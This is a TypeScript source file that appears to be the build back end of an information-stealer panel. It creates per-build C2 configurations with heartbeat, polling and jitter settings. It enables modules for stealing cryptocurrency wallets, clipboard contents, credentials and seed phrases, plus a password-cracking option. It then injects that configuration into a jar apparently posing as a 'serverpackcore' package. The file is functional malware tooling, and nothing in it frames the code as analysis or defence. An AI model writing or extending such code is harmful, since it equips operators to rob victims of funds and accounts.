import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { b64u, enrollTokenV2, enrollTokenHashV2, sealSecret } from '../lib/crypto';

export type BuildConfig = {
  schema: 1;
  build_id: string;
  build_secret: string;
  artifact_scheme: 1 | 2;
  c2_base: string;
  panel_url: string;
  resolver_url: string;
  /// Base64 SPKI SHA-256, current + next. Empty keeps the system trust store.
  tls_pins: string[];
  enroll_grace_hours: number;
  profile: 'lite' | 'full';
  modules: { wallets: boolean; clipboard: boolean; credentials: boolean; seeds: boolean };
  bandwidth_kbps: number;
  heartbeat_sec: number;
  poll_sec: number;
  jitter_pct: number;
  crack: { enabled: boolean; max_seconds: number; max_cpu_pct: number };
  artifact: { chunk_size: number; max_mb: number };
};

export async function createBuild(input: {
  name: string;
  version: string;
  profile: 'lite' | 'full';
  operatorId: string;
  c2Base?: string;
  modules?: { wallets: boolean; clipboard: boolean; credentials: boolean; seeds: boolean };
  crack?: boolean;
  enrollGraceHours?: number;
}): Promise<{ id: string; buildId: string; token: string; config: BuildConfig }> {
  const secret = b64u(randomBytes(32));
  const buildId = randomUUID();
  const config: BuildConfig = {
    schema: 1,
    build_id: buildId,
    build_secret: secret,
    artifact_scheme: 2,
    c2_base: input.c2Base ?? `${env.PUBLIC_URL}/api/v1`,
    panel_url: env.PUBLIC_URL,
    resolver_url: '',
    tls_pins: [],
    enroll_grace_hours: input.enrollGraceHours ?? 24,
    profile: input.profile,
    modules: {
      wallets: input.modules?.wallets ?? true,
      clipboard: input.profile === 'full' && (input.modules?.clipboard ?? true),
      credentials: input.profile === 'full' && (input.modules?.credentials ?? true),
      seeds: input.profile === 'full' && (input.modules?.seeds ?? true)
    },
    bandwidth_kbps: input.profile === 'lite' ? 256 : 1024,
    heartbeat_sec: 30,
    poll_sec: 20,
    jitter_pct: 20,
    crack: { enabled: input.profile === 'full' && (input.crack ?? true), max_seconds: 90, max_cpu_pct: 50 },
    artifact: { chunk_size: 524288, max_mb: input.profile === 'lite' ? 64 : 512 }
  };
  const build = await prisma.build.create({
    data: {
      name: input.name,
      version: input.version,
      profile: input.profile,
      buildId,
      tokenHash: enrollTokenHashV2(secret, buildId),
      secret: sealSecret(secret),
      enrollScheme: 2,
      enrollGraceHours: input.enrollGraceHours ?? 24,
      config: config as never,
      createdById: input.operatorId
    }
  });
  return { id: build.id, buildId, token: enrollTokenV2(secret, buildId), config };
}

/** Writes config.json into a copy of the jar (STORED entry), returns the jar path. */
export async function injectConfig(jarPath: string, config: BuildConfig, target: string): Promise<string> {
  const { default: JSZip } = await import('jszip').catch(() => ({ default: null as never }));
  if (JSZip) return injectWithJszip(JSZip, jarPath, config, target);
  return injectWithJava(jarPath, config, target);
}

async function injectWithJszip(
  JSZip: typeof import('jszip'),
  jarPath: string,
  config: BuildConfig,
  target: string
): Promise<string> {
  const zip = await JSZip.loadAsync(await readFile(jarPath));
  zip.file('serverpackcore/config.json', JSON.stringify(config, null, 2));
  const data = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE', compressionOptions: { level: 6 } });
  await mkdir(dirname(target), { recursive: true });
  await writeFile(target, data, { mode: 0o640 });
  return target;
}

async function injectWithJava(jarPath: string, config: BuildConfig, target: string): Promise<string> {
  const { execFile } = await import('node:child_process');
  const { copyFile } = await import('node:fs/promises');
  const { promisify } = await import('node:util');
  await mkdir(dirname(target), { recursive: true });
  await copyFile(jarPath, target);
  await promisify(execFile)('jar', ['uf', target, '-C', await writeConfig(config), 'serverpackcore/config.json']);
  return target;
}

async function writeConfig(config: BuildConfig): Promise<string> {
  const dir = join(env.BUILD_DIR, 'tmp', createHash('sha1').update(config.build_id).digest('hex'));
  await mkdir(join(dir, 'serverpackcore'), { recursive: true });
  await writeFile(join(dir, 'serverpackcore', 'config.json'), JSON.stringify(config, null, 2));
  return dir;
}

export async function storeDeviceToken(token: string): Promise<string> {
  return sealSecret(token);
}
